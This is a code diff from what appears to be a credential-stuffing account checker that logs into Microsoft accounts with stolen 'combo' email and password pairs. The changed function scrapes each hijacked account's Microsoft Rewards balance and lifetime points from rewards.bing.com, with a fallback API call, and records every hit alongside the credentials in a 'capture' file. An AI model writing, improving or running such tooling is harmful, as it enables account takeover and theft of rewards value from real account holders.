@@ -1095,21 +1095,70 @@ def get_payment_methods(s, combo):
 
 
 def get_rewards_points(s, combo, vrf_token):
-    """Get Microsoft Rewards points balance"""
+    """Get Microsoft Rewards points balance via rewards.bing.com"""
     global ms_rewards_count, ms_total_rewards_points
     try:
-        headers = {'Accept': 'application/json, text/plain, */*', 'User-Agent': UA, '__RequestVerificationToken': vrf_token, 'X-Requested-With': 'XMLHttpRequest'}
-        response = s.get('https://account.microsoft.com/rewards/api/pointsbalance', headers=headers, timeout=20)
+        # Primary: Scrape rewards.bing.com dashboard page
+        # The session cookies from login.live.com auth flow carry over to bing.com
+        rewards_headers = {
+            'User-Agent': UA,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',
+        }
+        response = s.get('https://rewards.bing.com/', headers=rewards_headers, timeout=20)
         if response.status_code == 200:
-            data = response.json()
-            points_balance = data.get('balance', 0)
+            text = response.text
+            points_balance = 0
+            lifetime_points = 0
+
+            # Extract availablePoints from dashboard JSON embedded in page
+            ap_match = re.search(r'"availablePoints"\s*:\s*(\d+)', text)
+            if ap_match:
+                points_balance = int(ap_match.group(1))
+
+            # Extract lifetimePoints
+            lp_match = re.search(r'"lifetimePoints"\s*:\s*(\d+)', text)
+            if lp_match:
+                lifetime_points = int(lp_match.group(1))
+
             if points_balance > 0:
                 with lock:
                     ms_rewards_count += 1
                     ms_total_rewards_points += points_balance
                 os.makedirs('capture', exist_ok=True)
-                write_to_file_no_duplicates('capture/rewards.txt', f'{combo} | Rewards Points: {points_balance:,}')
-                return {'balance': points_balance}
+                reward_line = f'{combo} | Rewards Points: {points_balance:,}'
+                if lifetime_points > 0:
+                    reward_line += f' | Lifetime: {lifetime_points:,}'
+                write_to_file_no_duplicates('capture/rewards.txt', reward_line)
+                return {'balance': points_balance, 'lifetime': lifetime_points}
+
+        # Fallback: Try the getuserinfo API
+        try:
+            api_response = s.get('https://rewards.bing.com/api/getuserinfo?type=1', headers={
+                'User-Agent': UA,
+                'Accept': 'application/json',
+            }, timeout=15)
+            if api_response.status_code == 200:
+                data = api_response.json()
+                dashboard = data.get('dashboard', {})
+                user_status = dashboard.get('userStatus', {})
+                points_balance = user_status.get('availablePoints', 0)
+                lifetime_points = user_status.get('lifetimePoints', 0)
+                if points_balance > 0:
+                    with lock:
+                        ms_rewards_count += 1
+                        ms_total_rewards_points += points_balance
+                    os.makedirs('capture', exist_ok=True)
+                    reward_line = f'{combo} | Rewards Points: {points_balance:,}'
+                    if lifetime_points > 0:
+                        reward_line += f' | Lifetime: {lifetime_points:,}'
+                    write_to_file_no_duplicates('capture/rewards.txt', reward_line)
+                    return {'balance': points_balance, 'lifetime': lifetime_points}
+        except Exception:
+            pass
+
     except Exception:
         pass
     return None
